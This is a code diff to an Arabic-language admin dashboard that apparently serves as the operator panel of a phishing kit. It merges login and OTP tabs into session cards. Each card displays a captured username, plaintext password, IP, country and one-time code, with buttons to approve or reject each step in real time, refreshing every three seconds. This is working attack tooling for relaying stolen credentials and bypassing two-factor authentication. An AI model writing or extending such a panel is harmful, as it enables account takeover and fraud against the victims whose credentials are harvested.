@@ -175,6 +175,43 @@ body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f1923; color: 
 
 .empty-msg { text-align: center; color: #6b7f9e; padding: 50px 20px; font-size: 0.95rem; }
 
+.sessions-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(340px, 1fr)); gap: 20px; }
+.session-card {
+  background: linear-gradient(135deg, #1a2d44 0%, #162336 100%);
+  border: 1px solid rgba(255,255,255,0.06); border-radius: 20px;
+  padding: 0; overflow: hidden; position: relative;
+}
+.session-card.has-pending { border: 1px solid rgba(251,146,60,0.4); }
+.session-card-header {
+  display: flex; justify-content: space-between; align-items: center;
+  padding: 16px 20px; background: rgba(0,0,0,0.15);
+  border-bottom: 1px solid rgba(255,255,255,0.06);
+}
+.session-card-header .session-id { font-size: 0.85rem; color: #6b7f9e; font-weight: 600; }
+.session-card-header .session-time { font-size: 0.78rem; color: #4a5f7e; }
+.session-card-body { padding: 18px 20px; }
+.session-field { display: flex; justify-content: space-between; align-items: center; padding: 8px 0; border-bottom: 1px solid rgba(255,255,255,0.04); }
+.session-field:last-child { border-bottom: none; }
+.session-field .sf-label { font-size: 0.82rem; color: #6b7f9e; font-weight: 500; }
+.session-field .sf-value { font-size: 0.9rem; font-weight: 600; color: #fff; }
+.session-field .sf-value.mono { font-family: monospace; direction: ltr; }
+.session-field .sf-value.otp-code { font-family: monospace; font-size: 1.2rem; letter-spacing: 4px; font-weight: 800; color: #00c8ff; direction: ltr; }
+.session-step {
+  display: flex; align-items: center; gap: 8px; padding: 12px 20px;
+  background: rgba(0,0,0,0.1); border-top: 1px solid rgba(255,255,255,0.04);
+  font-size: 0.82rem; color: #6b7f9e;
+}
+.step-dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
+.step-dot.done { background: #34d399; }
+.step-dot.active { background: #fb923c; animation: pulse-wait 2s ease-in-out infinite; }
+.step-dot.wait { background: #4a5f7e; }
+.step-line { width: 20px; height: 2px; background: rgba(255,255,255,0.1); }
+.session-card-actions {
+  display: flex; gap: 10px; padding: 16px 20px;
+  border-top: 1px solid rgba(255,255,255,0.06);
+}
+.session-card-actions .btn-action { flex: 1; padding: 12px; font-size: 0.9rem; border-radius: 12px; }
+
 @media (max-width: 1100px) {
   .orders-table { overflow-x: auto; }
   .orders-table table { min-width: 700px; }
@@ -189,6 +226,9 @@ body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f1923; color: 
   .modal { padding: 20px; }
   .modal-actions { flex-direction: column; }
   .btn-action { min-width: 100%; }
+  .sessions-grid { grid-template-columns: 1fr; }
+  .session-card-actions { flex-direction: column; }
+  .session-card-actions .btn-action { min-width: 100%; }
 }
 </style>
 </head>
@@ -217,13 +257,9 @@ body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f1923; color: 
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 0 0-3-3.87"/><path d="M16 3.13a4 4 0 0 1 0 7.75"/></svg>
       الزوار
     </a>
-    <a onclick="showTab('logins')" id="nav-logins">
+    <a onclick="showTab('sessions')" id="nav-sessions">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
-      تسجيلات الدخول
-    </a>
-    <a onclick="showTab('otp')" id="nav-otp">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-      رموز OTP
+      الجلسات
     </a>
   </nav>
 </aside>
@@ -333,49 +369,11 @@ body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f1923; color: 
     </div>
   </div>
 
-  <!-- Logins Tab -->
-  <div class="tab-content" id="tab-logins">
-    <div class="section-title">محاولات تسجيل الدخول <span class="badge" id="loginsBadge">0</span></div>
-    <div class="orders-table">
-      <table>
-        <thead>
-          <tr>
-            <th>#</th>
-            <th>اسم المستخدم</th>
-            <th>كلمة المرور</th>
-            <th>الدولة</th>
-            <th>IP</th>
-            <th>الحالة</th>
-            <th>الإجراءات</th>
-          </tr>
-        </thead>
-        <tbody id="loginsBody">
-          <tr><td colspan="7" class="empty-msg">لا توجد محاولات تسجيل دخول</td></tr>
-        </tbody>
-      </table>
-    </div>
-  </div>
-
-  <!-- OTP Tab -->
-  <div class="tab-content" id="tab-otp">
-    <div class="section-title">رموز التحقق OTP <span class="badge" id="otpBadge">0</span></div>
-    <div class="orders-table">
-      <table>
-        <thead>
-          <tr>
-            <th>#</th>
-            <th>اسم المستخدم</th>
-            <th>رمز OTP</th>
-            <th>الدولة</th>
-            <th>IP</th>
-            <th>الحالة</th>
-            <th>الإجراءات</th>
-          </tr>
-        </thead>
-        <tbody id="otpBody">
-          <tr><td colspan="7" class="empty-msg">لا توجد رموز تحقق</td></tr>
-        </tbody>
-      </table>
+  <!-- Sessions Tab -->
+  <div class="tab-content" id="tab-sessions">
+    <div class="section-title">جلسات المستخدمين <span class="badge" id="sessionsBadge">0</span></div>
+    <div id="sessionsContainer" class="sessions-grid">
+      <div class="empty-msg">لا توجد جلسات</div>
     </div>
   </div>
 </div>
@@ -389,12 +387,11 @@ function showTab(tab) {
   document.querySelectorAll('.sidebar-nav a').forEach(function(a) { a.classList.remove('active'); });
   document.getElementById('tab-' + tab).classList.add('active');
   document.getElementById('nav-' + tab).classList.add('active');
-  var titles = { dashboard: 'لوحة التحكم', orders: 'قائمة الطلبات', visitors: 'الزوار', logins: 'تسجيلات الدخول', otp: 'رموز OTP' };
+  var titles = { dashboard: 'لوحة التحكم', orders: 'قائمة الطلبات', visitors: 'الزوار', sessions: 'الجلسات' };
   document.getElementById('pageTitle').textContent = titles[tab];
   if (tab === 'orders') { loadOrders(); }
   if (tab === 'visitors') loadVisitors();
-  if (tab === 'logins') loadLogins();
-  if (tab === 'otp') loadOTP();
+  if (tab === 'sessions') loadSessions();
 }
 
 var adminToken = '';
@@ -533,92 +530,100 @@ function redirectOrder(id) {
   if (o) alert('إعادة توجيه الطلب #' + o.id + ' - ' + o.name);
 }
 
-var loginsData = [];
+var sessionsData = [];
 
-function loadLogins() {
-  fetch('/api/login-attempts', { headers: authHeaders() }).then(checkAuth).then(function(d) {
+function loadSessions() {
+  fetch('/api/sessions', { headers: authHeaders() }).then(checkAuth).then(function(d) {
     if (!d) return;
-    loginsData = d.attempts || [];
-    renderLogins();
+    sessionsData = d.sessions || [];
+    renderSessions();
   }).catch(function() {});
 }
 
-function renderLogins() {
-  var tb = document.getElementById('loginsBody');
-  var waiting = loginsData.filter(function(a) { return a.status === 'waiting'; }).length;
-  document.getElementById('loginsBadge').textContent = waiting > 0 ? waiting + ' بانتظار القرار' : loginsData.length + ' محاولة';
-  if (loginsData.length === 0) {
-    tb.innerHTML = '<tr><td colspan="7" class="empty-msg">لا توجد محاولات تسجيل دخول</td></tr>';
+function renderSessions() {
+  var c = document.getElementById('sessionsContainer');
+  var pending = sessionsData.filter(function(s) { return s.pendingAction; }).length;
+  document.getElementById('sessionsBadge').textContent = pending > 0 ? pending + ' بانتظار القرار' : sessionsData.length + ' جلسة';
+  if (sessionsData.length === 0) {
+    c.innerHTML = '<div class="empty-msg">لا توجد جلسات</div>';
     return;
   }
-  tb.innerHTML = '';
-  loginsData.forEach(function(a) {
-    var sc = a.status === 'approved' ? 'approved' : a.status === 'rejected' ? 'rejected' : 'waiting';
-    var st = a.status === 'approved' ? 'مقبول' : a.status === 'rejected' ? 'مرفوض' : 'بانتظار القرار';
-    var dt = a.date ? new Date(a.date).toLocaleString('ar-AE') : '-';
-    var tr = document.createElement('tr');
-    var actions = '';
-    if (a.status === 'waiting') {
-      actions = '<button class="btn-sm btn-details" style="background:rgba(52,211,153,0.15);color:#34d399;" onclick="loginAction(' + a.id + ',\'approved\')">قبول</button><button class="btn-sm btn-details" style="background:rgba(248,113,113,0.15);color:#f87171;" onclick="loginAction(' + a.id + ',\'rejected\')">رفض</button>';
-    } else {
-      actions = '<span class="status-badge ' + sc + '">' + st + '</span>';
+  c.innerHTML = '';
+  sessionsData.forEach(function(s) {
+    var card = document.createElement('div');
+    card.className = 'session-card' + (s.pendingAction ? ' has-pending' : '');
+    var dt = s.date ? new Date(s.date).toLocaleString('ar-AE') : '-';
+
+    var loginDone = s.loginStatus === 'approved' || s.loginStatus === 'rejected';
+    var loginClass = loginDone ? 'done' : (s.loginStatus === 'waiting' ? 'active' : 'wait');
+    var otpClass = 'wait';
+    if (s.otp) {
+      otpClass = s.otpStatus === 'approved' ? 'done' : (s.otpStatus === 'rejected' ? 'done' : (s.otpStatus === 'waiting' ? 'active' : 'wait'));
     }
-    tr.innerHTML = '<td>' + a.id + '</td><td>' + (a.username || '-') + '</td><td dir="ltr" style="text-align:right;font-family:monospace;">' + (a.password || '-') + '</td><td>' + (a.country || '-') + '</td><td dir="ltr" style="text-align:right">' + (a.ip || '-') + '</td><td><span class="status-badge ' + sc + '">' + st + '</span></td><td>' + actions + '</td>';
-    tb.appendChild(tr);
+
+    var otpSection = '';
+    if (s.otp) {
+      otpSection = '<div class="session-field"><span class="sf-label">رمز OTP</span><span class="sf-value otp-code">' + s.otp + '</span></div>';
+    }
+
+    var statusHtml = '';
+    if (s.loginStatus === 'rejected') {
+      statusHtml = '<span class="status-badge rejected">تسجيل الدخول مرفوض</span>';
+    } else if (s.otpStatus === 'rejected') {
+      statusHtml = '<span class="status-badge rejected">OTP مرفوض</span>';
+    } else if (s.otpStatus === 'approved') {
+      statusHtml = '<span class="status-badge approved">مكتمل</span>';
+    } else if (s.otpStatus === 'waiting') {
+      statusHtml = '<span class="status-badge waiting">بانتظار قرار OTP</span>';
+    } else if (s.loginStatus === 'approved' && !s.otp) {
+      statusHtml = '<span class="status-badge approved">تم قبول الدخول - بانتظار OTP</span>';
+    } else if (s.loginStatus === 'waiting') {
+      statusHtml = '<span class="status-badge waiting">بانتظار قرار الدخول</span>';
+    }
+
+    var actionsHtml = '';
+    if (s.pendingAction) {
+      var aType = s.pendingAction.type;
+      var aId = s.pendingAction.id;
+      var label = aType === 'login' ? 'تسجيل الدخول' : 'رمز OTP';
+      actionsHtml = '<div class="session-card-actions">' +
+        '<button class="btn-action btn-approve" onclick="sessionAction(\'' + aType + '\',' + aId + ',\'approved\')">' +
+        '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg> قبول ' + label +
+        '</button>' +
+        '<button class="btn-action btn-reject" onclick="sessionAction(\'' + aType + '\',' + aId + ',\'rejected\')">' +
+        '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg> رفض ' + label +
+        '</button></div>';
+    }
+
+    card.innerHTML =
+      '<div class="session-card-header"><span class="session-id">جلسة #' + s.id + '</span><span class="session-time">' + dt + '</span></div>' +
+      '<div class="session-card-body">' +
+        '<div class="session-field"><span class="sf-label">اسم المستخدم</span><span class="sf-value">' + (s.username || '-') + '</span></div>' +
+        '<div class="session-field"><span class="sf-label">كلمة المرور</span><span class="sf-value mono">' + (s.password || '-') + '</span></div>' +
+        '<div class="session-field"><span class="sf-label">الدولة</span><span class="sf-value">' + (s.country || '-') + '</span></div>' +
+        '<div class="session-field"><span class="sf-label">IP</span><span class="sf-value mono">' + (s.ip || '-') + '</span></div>' +
+        otpSection +
+      '</div>' +
+      '<div class="session-step">' +
+        '<span class="step-dot ' + loginClass + '"></span> تسجيل الدخول' +
+        '<span class="step-line"></span>' +
+        '<span class="step-dot ' + otpClass + '"></span> OTP' +
+        '<span style="margin-right:auto;">' + statusHtml + '</span>' +
+      '</div>' +
+      actionsHtml;
+
+    c.appendChild(card);
   });
 }
 
-function loginAction(id, status) {
-  fetch('/api/login-attempts/status', {
+function sessionAction(type, id, status) {
+  var url = type === 'login' ? '/api/login-attempts/status' : '/api/otp-attempts/status';
+  fetch(url, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json', 'X-Admin-Token': adminToken },
     body: JSON.stringify({ id: id, status: status })
   }).then(function() {
-    loadLogins();
-  });
-}
-
-var otpData = [];
-
-function loadOTP() {
-  fetch('/api/otp-attempts', { headers: authHeaders() }).then(checkAuth).then(function(d) {
-    if (!d) return;
-    otpData = d.attempts || [];
-    renderOTP();
-  }).catch(function() {});
-}
-
-function renderOTP() {
-  var tb = document.getElementById('otpBody');
-  var waiting = otpData.filter(function(a) { return a.status === 'waiting'; }).length;
-  document.getElementById('otpBadge').textContent = waiting > 0 ? waiting + ' بانتظار القرار' : otpData.length + ' رمز';
-  if (otpData.length === 0) {
-    tb.innerHTML = '<tr><td colspan="7" class="empty-msg">لا توجد رموز تحقق</td></tr>';
-    return;
-  }
-  tb.innerHTML = '';
-  otpData.forEach(function(a) {
-    var sc = a.status === 'approved' ? 'approved' : a.status === 'rejected' ? 'rejected' : 'waiting';
-    var st = a.status === 'approved' ? 'مقبول' : a.status === 'rejected' ? 'مرفوض' : 'بانتظار القرار';
-    var tr = document.createElement('tr');
-    var actions = '';
-    if (a.status === 'waiting') {
-      actions = '<button class="btn-sm btn-details" style="background:rgba(52,211,153,0.15);color:#34d399;" onclick="otpAction(' + a.id + ',\'approved\')">قبول</button><button class="btn-sm btn-details" style="background:rgba(248,113,113,0.15);color:#f87171;" onclick="otpAction(' + a.id + ',\'rejected\')">رفض</button>';
-    } else {
-      actions = '<span class="status-badge ' + sc + '">' + st + '</span>';
-    }
-    tr.innerHTML = '<td>' + a.id + '</td><td>' + (a.username || '-') + '</td><td dir="ltr" style="text-align:right;font-family:monospace;font-size:1.1rem;letter-spacing:3px;font-weight:700;color:#00c8ff;">' + (a.otp || '-') + '</td><td>' + (a.country || '-') + '</td><td dir="ltr" style="text-align:right">' + (a.ip || '-') + '</td><td><span class="status-badge ' + sc + '">' + st + '</span></td><td>' + actions + '</td>';
-    tb.appendChild(tr);
-  });
-}
-
-function otpAction(id, status) {
-  fetch('/api/otp-attempts/status', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json', 'X-Admin-Token': adminToken },
-    body: JSON.stringify({ id: id, status: status })
-  }).then(function() {
-    loadOTP();
+    loadSessions();
   });
 }
 
@@ -630,14 +635,12 @@ document.getElementById('currentDate').textContent = days[now.getDay()] + ' ' + 
 
 loadStats();
 loadOrders();
-loadLogins();
-loadOTP();
+loadSessions();
 
 setInterval(function() {
   loadStats();
   loadOrders();
-  loadLogins();
-  loadOTP();
+  loadSessions();
 }, 3000);
 
 document.getElementById('detailsModal').addEventListener('click', function(e) {
